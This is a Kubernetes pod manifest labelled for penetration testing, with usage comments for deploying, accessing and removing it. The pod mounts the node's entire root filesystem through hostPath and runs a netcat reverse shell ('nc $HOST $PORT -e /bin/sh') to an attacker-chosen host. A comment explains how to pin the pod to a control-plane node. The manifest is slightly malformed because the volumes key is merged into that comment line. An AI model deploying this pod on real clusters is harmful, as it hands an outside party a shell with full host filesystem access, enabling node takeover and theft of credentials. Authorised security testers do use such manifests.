## Deploy: kubectl -n [namespace] apply -f pod-hostpath-revshell.yaml 
## Access: kubectl -n [namespace] exec -it pod-hostpath-revshell -- bash
## Remove: kubectl -n [namespace] delete pod-hostpath-revshell
###########################################################
apiVersion: v1
kind: Pod
metadata:
  name: pod-hostpath-revshell
  labels:
    app: pentest
spec:
  containers:
  - name: hostpath-revshell
    image: busybox
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "nc $HOST $PORT  -e /bin/sh;" ]
    #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name  volumes:
  - name: noderoot
    hostPath:
      path: /